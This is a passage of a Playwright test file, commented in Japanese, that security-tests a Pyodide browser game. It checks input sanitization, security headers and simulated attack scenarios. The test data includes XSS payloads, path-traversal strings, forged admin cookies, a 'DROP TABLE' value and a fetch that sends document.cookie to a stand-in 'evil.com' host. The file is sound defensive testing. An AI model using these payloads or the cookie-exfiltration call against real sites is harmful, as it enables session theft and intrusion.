          { value: 'NUL', description: 'Windows予約語' },
          { value: 'file://', description: 'ファイルURL' },
          { value: 'data:', description: 'データURL' }
        ],
        schema: { type: 'string', minLength: 1, maxLength: 20 }
      },
      // エンコーディングテスト
      {
        category: 'エンコーディング',
        inputs: [
          { value: '%00', description: 'URLエンコードnull' },
          { value: '%2F', description: 'URLエンコードスラッシュ' },
          { value: '%3C%3E', description: 'URLエンコードタグ' },
          { value: '%u0000', description: 'Unicode URLエンコード' },
          { value: '\x00', description: 'Hex null' },
          { value: '\x3C\x3E', description: 'Hexタグ' },
          { value: String.fromCharCode(0), description: 'fromCharCode null' },
          { value: String.fromCharCode(60, 62), description: 'fromCharCode タグ' },
          { value: decodeURIComponent('%3Cscript%3E'), description: 'デコードされたスクリプト' },
          { value: atob('PHNjcmlwdD4='), description: 'Base64デコード' }
        ],
        schema: { type: 'string', minLength: 1, maxLength: 50 }
      }
    ];

    console.log('🧪 境界値テストを実行中...');

    for (const testCategory of boundaryTests) {
      console.log(`\n📋 ${testCategory.category}テスト:`);

      for (const inputTest of testCategory.inputs) {
        console.log(`  🔍 ${inputTest.description}: "${inputTest.value}"`);

        try {
          // 入力サニタイゼーションテスト
          const sanitizationResult = await page.evaluate((input) => {
            return window.testInputSanitization(input, 'boundary_test');
          }, inputTest.value);

          // データ検証テスト
          const validationResult = await page.evaluate((input, schema) => {
            return window.validateDataIntegrity(input, schema);
          }, inputTest.value, testCategory.schema);

          console.log(`    🛡️ サニタイゼーション: ${sanitizationResult.isSafe ? '✅ 安全' : '⚠️ 脅威検出'}`);
          if (sanitizationResult.threats.length > 0) {
            console.log(`      脅威: ${sanitizationResult.threats.join(', ')}`);
          }

          console.log(`    📋 検証: ${validationResult.isValid ? '✅ 有効' : '❌ 無効'}`);
          if (validationResult.violations.length > 0) {
            console.log(`      違反: ${validationResult.violations.map(v => v.type).join(', ')}`);
          }

        } catch (e) {
          console.log(`    ❌ テストエラー: ${e.message}`);
        }

        await page.waitForTimeout(50);
      }
    }

    // Unicode境界値テスト
    console.log('\n🌐 Unicode境界値テスト:');

    const unicodeTests = [
      { codePoint: 0x0000, description: 'NULL' },
      { codePoint: 0x001F, description: '制御文字最大' },
      { codePoint: 0x0020, description: 'スペース' },
      { codePoint: 0x007F, description: 'DEL' },
      { codePoint: 0x0080, description: 'Latin-1補助開始' },
      { codePoint: 0x00FF, description: 'Latin-1補助最大' },
      { codePoint: 0x0100, description: 'Latin拡張A開始' },
      { codePoint: 0xD7FF, description: 'サロゲート前' },
      { codePoint: 0xE000, description: 'プライベート使用域' },
      { codePoint: 0xFFFD, description: '置換文字' },
      { codePoint: 0xFFFF, description: 'BMP最大' }
    ];

    for (const unicodeTest of unicodeTests) {
      const char = String.fromCharCode(unicodeTest.codePoint);
      console.log(`  🔍 U+${unicodeTest.codePoint.toString(16).padStart(4, '0')} (${unicodeTest.description})`);

      const sanitizationResult = await page.evaluate((input) => {
        return window.testInputSanitization(input, 'unicode_test');
      }, char);

      console.log(`    🛡️ ${sanitizationResult.isSafe ? '✅ 安全' : '⚠️ 脅威検出'}`);
    }

    console.log('✅ 入力検証・サニタイゼーション境界値テスト完了');
  });

  test('セキュリティヘッダー・ポリシー検証テスト', async ({ page }) => {
    console.log('🔒 セキュリティヘッダー・ポリシー検証テストを開始...');

    await page.goto('http://localhost:3000/docs/game.html');

    // Pyodideの初期化を待つ
    try {
      const loadingOverlay = page.locator('#loadingOverlay');
      await expect(loadingOverlay).toBeHidden({ timeout: 60000 });
      console.log('✅ Pyodide初期化完了');
    } catch (e) {
      console.log('⚠️ Pyodide初期化タイムアウト');
    }

    // レスポンスヘッダーの確認
    console.log('🧪 セキュリティヘッダー検証中...');

    const securityHeaders = await page.evaluate(async () => {
      try {
        const response = await fetch(location.href);
        const headers = {};

        // セキュリティ関連ヘッダーを収集
        const securityHeaderNames = [
          'Content-Security-Policy',
          'X-Content-Type-Options',
          'X-Frame-Options',
          'X-XSS-Protection',
          'Strict-Transport-Security',
          'Referrer-Policy',
          'Feature-Policy',
          'Permissions-Policy',
          'Cross-Origin-Embedder-Policy',
          'Cross-Origin-Opener-Policy',
          'Cross-Origin-Resource-Policy'
        ];

        securityHeaderNames.forEach(headerName => {
          headers[headerName] = response.headers.get(headerName);
        });

        return headers;
      } catch (e) {
        return { error: e.message };
      }
    });

    console.log('📊 セキュリティヘッダー検査結果:');

    // Content Security Policy検証
    if (securityHeaders['Content-Security-Policy']) {
      console.log('  🛡️ CSP: ✅ 設定済み');
      console.log(`    📋 値: ${securityHeaders['Content-Security-Policy']}`);

      // CSPディレクティブの解析
      const cspDirectives = securityHeaders['Content-Security-Policy'].split(';');
      const importantDirectives = ['default-src', 'script-src', 'style-src', 'img-src'];

      importantDirectives.forEach(directive => {
        const found = cspDirectives.find(d => d.trim().startsWith(directive));
        if (found) {
          console.log(`    ✅ ${directive}: ${found.trim()}`);
        } else {
          console.log(`    ⚠️ ${directive}: 未設定`);
        }
      });
    } else {
      console.log('  🛡️ CSP: ⚠️ 未設定');
    }

    // X-Content-Type-Options検証
    if (securityHeaders['X-Content-Type-Options']) {
      console.log(`  🛡️ X-Content-Type-Options: ✅ ${securityHeaders['X-Content-Type-Options']}`);
      expect(securityHeaders['X-Content-Type-Options']).toBe('nosniff');
    } else {
      console.log('  🛡️ X-Content-Type-Options: ⚠️ 未設定');
    }

    // X-Frame-Options検証
    if (securityHeaders['X-Frame-Options']) {
      console.log(`  🛡️ X-Frame-Options: ✅ ${securityHeaders['X-Frame-Options']}`);
      expect(['DENY', 'SAMEORIGIN'].includes(securityHeaders['X-Frame-Options'])).toBe(true);
    } else {
      console.log('  🛡️ X-Frame-Options: ⚠️ 未設定');
    }

    // Referrer-Policy検証
    if (securityHeaders['Referrer-Policy']) {
      console.log(`  🛡️ Referrer-Policy: ✅ ${securityHeaders['Referrer-Policy']}`);
    } else {
      console.log('  🛡️ Referrer-Policy: ⚠️ 未設定');
    }

    // Permissions-Policy検証
    if (securityHeaders['Permissions-Policy']) {
      console.log(`  🛡️ Permissions-Policy: ✅ ${securityHeaders['Permissions-Policy']}`);
    } else {
      console.log('  🛡️ Permissions-Policy: ⚠️ 未設定');
    }

    // ブラウザセキュリティポリシーテスト
    console.log('\n🧪 ブラウザセキュリティポリシーテスト:');

    // Same-Origin Policy テスト
    const sameOriginTest = await page.evaluate(() => {
      try {
        // 別オリジンへのアクセステスト
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://example.com', false);
        xhr.send();
        return { blocked: false, response: xhr.status };
      } catch (e) {
        return { blocked: true, error: e.message };
      }
    });

    console.log(`  🌐 Same-Origin Policy: ${sameOriginTest.blocked ? '✅ 正常にブロック' : '⚠️ ブロックされず'}`);

    // Mixed Content検証
    if (page.url().startsWith('https://')) {
      console.log('  🔒 Mixed Contentテスト:');

      const mixedContentTest = await page.evaluate(() => {
        return new Promise((resolve) => {
          const img = new Image();
          const testTimeout = setTimeout(() => {
            resolve({ blocked: true, reason: 'timeout' });
          }, 5000);

          img.onload = () => {
            clearTimeout(testTimeout);
            resolve({ blocked: false, loaded: true });
          };

          img.onerror = () => {
            clearTimeout(testTimeout);
            resolve({ blocked: true, reason: 'error' });
          };

          // HTTPリソースを読み込み試行
          img.src = 'http://httpbin.org/status/200';
        });
      });

      console.log(`    📷 HTTP画像読み込み: ${mixedContentTest.blocked ? '✅ ブロック' : '⚠️ 許可'}`);
    }

    // Subresource Integrity (SRI) テスト
    console.log('  🔐 Subresource Integrityテスト:');

    const sriElements = await page.evaluate(() => {
      const scripts = Array.from(document.querySelectorAll('script[src]'));
      const links = Array.from(document.querySelectorAll('link[rel="stylesheet"]'));

      return {
        scripts: scripts.map(s => ({ src: s.src, integrity: s.integrity })),
        styles: links.map(l => ({ href: l.href, integrity: l.integrity }))
      };
    });

    sriElements.scripts.forEach(script => {
      if (script.src.includes('http') && !script.src.includes(page.url().split('/')[2])) {
        console.log(`    📜 外部スクリプト: ${script.src.substring(0, 50)}... ${script.integrity ? '✅ SRI有効' : '⚠️ SRI無効'}`);
      }
    });

    sriElements.styles.forEach(style => {
      if (style.href.includes('http') && !style.href.includes(page.url().split('/')[2])) {
        console.log(`    🎨 外部スタイル: ${style.href.substring(0, 50)}... ${style.integrity ? '✅ SRI有効' : '⚠️ SRI無効'}`);
      }
    });

    console.log('✅ セキュリティヘッダー・ポリシー検証テスト完了');
  });

  test('システム全体セキュリティ・整合性統合テスト', async ({ page }) => {
    console.log('🏛️ システム全体セキュリティ・整合性統合テストを開始...');

    await page.goto('http://localhost:3000/docs/game.html');

    // Pyodideの初期化を待つ
    try {
      const loadingOverlay = page.locator('#loadingOverlay');
      await expect(loadingOverlay).toBeHidden({ timeout: 60000 });
      console.log('✅ Pyodide初期化完了');
    } catch (e) {
      console.log('⚠️ Pyodide初期化タイムアウト');
    }

    await page.waitForTimeout(3000);

    // 統合セキュリティテストシナリオ
    console.log('🧪 統合セキュリティテストシナリオを実行中...');

    // シナリオ1: 悪意のあるユーザーによる総合攻撃シミュレーション
    console.log('\n📋 シナリオ1: 悪意のあるユーザー攻撃シミュレーション');

    const maliciousScenarios = [
      {
        name: 'XSSインジェクション + データ改ざん',
        actions: async () => {
          // XSSペイロードでランキング登録を試行
          await page.evaluate(() => {
            if (window.testInputSanitization) {
              window.testInputSanitization('<script>alert("XSS")</script>', 'ranking_name');
              window.testInputSanitization('<img src=x onerror=alert("XSS")>', 'ranking_name');
            }
          });

          // 不正なスコア値での登録試行
          await page.evaluate(() => {
            if (window.validateDataIntegrity) {
              window.validateDataIntegrity(999999999, { type: 'number', min: 0, max: 1000000 });
              window.validateDataIntegrity(-1000, { type: 'number', min: 0, max: 1000000 });
            }
          });
        }
      },
      {
        name: 'ストレージ操作 + セッションハイジャック',
        actions: async () => {
          // ローカルストレージの不正操作
          await page.evaluate(() => {
            try {
              localStorage.setItem('gameData', '<script>malicious()</script>');
              localStorage.setItem('ranking', '{"name":"<script>","score":"invalid"}');
              localStorage.setItem('userPrefs', '../../../etc/passwd');
            } catch (e) {
              console.log('LocalStorage operation blocked:', e.message);
            }
          });

          // クッキーの不正操作
          await page.evaluate(() => {
            try {
              document.cookie = 'admin=true; path=/';
              document.cookie = 'session=../../secret; path=/';
            } catch (e) {
              console.log('Cookie operation blocked:', e.message);
            }
          });
        }
      },
      {
        name: 'ネットワーク攻撃 + CSRF',
        actions: async () => {
          // 不正なAPIリクエスト
          await page.evaluate(async () => {
            try {
              await fetch('/api/rankings', {
                method: 'POST',
                body: JSON.stringify({
                  name: '<script>alert("CSRF")</script>',
                  score: 'DROP TABLE rankings'
                }),
                headers: { 'Content-Type': 'application/json' }
              });
            } catch (e) {
              console.log('API request blocked:', e.message);
            }

            // 外部への不正リクエスト
            try {
              await fetch('http://evil.com/steal?data=' + encodeURIComponent(document.cookie));
            } catch (e) {
              console.log('External request blocked:', e.message);
            }
          });
        }
      },
      {
        name: 'ゲーム状態改ざん',
        actions: async () => {
          // Pyodideゲーム状態の直接操作試行
          await page.evaluate(() => {
            if (window.pyodide && window.pyodide.runPython) {
              try {
                window.pyodide.runPython(`
try:
    if 'game_state' in globals():
        game_state.score.player_score = 999999999
        game_state.score.lives = 999
        print("Game state manipulation attempted")
except Exception as e:
    print("Game state manipulation blocked:", str(e))
                `);
              } catch (e) {
                console.log('Python manipulation blocked:', e.message);
              }
            }
          });
        }
      }
    ];

    // 各シナリオを実行
    for (const scenario of maliciousScenarios) {
      console.log(`  🧪 実行中: ${scenario.name}`);

      try {
        await scenario.actions();
        await page.waitForTimeout(500);
        console.log(`    ✅ シナリオ完了: ${scenario.name}`);
      } catch (e) {
        console.log(`    ⚠️ シナリオエラー: ${scenario.name} - ${e.message}`);
      }
    }

    // セキュリティメトリクスの最終評価
    console.log('\n📊 セキュリティメトリクス最終評価:');

    const finalSecurityMetrics = await page.evaluate(() => {
      if (window.securityTestData) {
        return {
          securityMetrics: window.securityTestData.securityMetrics,
          inputSanitizationTests: window.securityTestData.inputSanitization.length,
          dataValidationTests: window.securityTestData.dataValidationResults.length,
          storageTests: window.securityTestData.storageSecurityTests.length,
          networkTests: window.securityTestData.networkSecurityTests.length,
          integrityChecks: window.securityTestData.integrityViolations.length
        };
      }
      return null;
    });

    if (finalSecurityMetrics) {
      console.log('📈 セキュリティスコアカード:');
      console.log(`  🛡️ ブロックした攻撃: ${finalSecurityMetrics.securityMetrics.blockedAttacks}`);
      console.log(`  ✅ 検証合格: ${finalSecurityMetrics.securityMetrics.passedValidations}`);
      console.log(`  ❌ 検証失敗: ${finalSecurityMetrics.securityMetrics.failedValidations}`);
      console.log(`  ⚠️ セキュリティ警告: ${finalSecurityMetrics.securityMetrics.securityWarnings}`);
      console.log(`  🔍 データ不整合: ${finalSecurityMetrics.securityMetrics.dataInconsistencies}`);
      console.log(`  🧪 入力テスト: ${finalSecurityMetrics.inputSanitizationTests}`);
      console.log(`  📋 データ検証: ${finalSecurityMetrics.dataValidationTests}`);
      console.log(`  💾 ストレージテスト: ${finalSecurityMetrics.storageTests}`);
      console.log(`  🌐 ネットワークテスト: ${finalSecurityMetrics.networkTests}`);
      console.log(`  🔒 整合性チェック: ${finalSecurityMetrics.integrityChecks}`);

      // セキュリティ基準の評価
      const securityScore = {
        attackDefenseRate: finalSecurityMetrics.securityMetrics.blockedAttacks > 0 ? 100 : 0,
        validationSuccessRate: finalSecurityMetrics.securityMetrics.passedValidations > 0 ?
          (finalSecurityMetrics.securityMetrics.passedValidations /
           (finalSecurityMetrics.securityMetrics.passedValidations + finalSecurityMetrics.securityMetrics.failedValidations)) * 100 : 0,
        dataIntegrityRate: finalSecurityMetrics.securityMetrics.dataInconsistencies === 0 ? 100 :
          Math.max(0, 100 - (finalSecurityMetrics.securityMetrics.dataInconsistencies * 10))
      };

      console.log('\n🏆 セキュリティスコア:');
      console.log(`  🛡️ 攻撃防御率: ${securityScore.attackDefenseRate}%`);
      console.log(`  ✅ 検証成功率: ${securityScore.validationSuccessRate.toFixed(2)}%`);
      console.log(`  🔒 データ整合性率: ${securityScore.dataIntegrityRate}%`);

      const overallScore = (securityScore.attackDefenseRate + securityScore.validationSuccessRate + securityScore.dataIntegrityRate) / 3;
      console.log(`  📊 総合セキュリティスコア: ${overallScore.toFixed(2)}%`);

      // セキュリティ基準チェック
      expect(securityScore.attackDefenseRate).toBeGreaterThan(0); // 攻撃をブロックしている
      expect(securityScore.dataIntegrityRate).toBeGreaterThan(80); // データ整合性80%以上
      expect(overallScore).toBeGreaterThan(70); // 総合スコア70%以上

      if (overallScore >= 90) {
        console.log('🏅 セキュリティ評価: 優秀 (90%以上)');
      } else if (overallScore >= 80) {
        console.log('🥈 セキュリティ評価: 良好 (80%以上)');
      } else if (overallScore >= 70) {
        console.log('🥉 セキュリティ評価: 及第点 (70%以上)');
      } else {
        console.log('⚠️ セキュリティ評価: 要改善 (70%未満)');
      }
    }

    // 最終的なゲーム動作確認
    console.log('\n🎮 セキュリティテスト後のゲーム動作確認:');

    await expect(page.locator('#gameCanvas')).toBeVisible();

    // 基本操作が正常に動作することを確認
    await page.keyboard.press('ArrowLeft');
    await page.waitForTimeout(500);
    await page.keyboard.press('Space');
    await page.waitForTimeout(500);

    console.log('✅ セキュリティテスト後もゲーム基本機能正常');

    console.log('✅ システム全体セキュリティ・整合性統合テスト完了');
  });

});
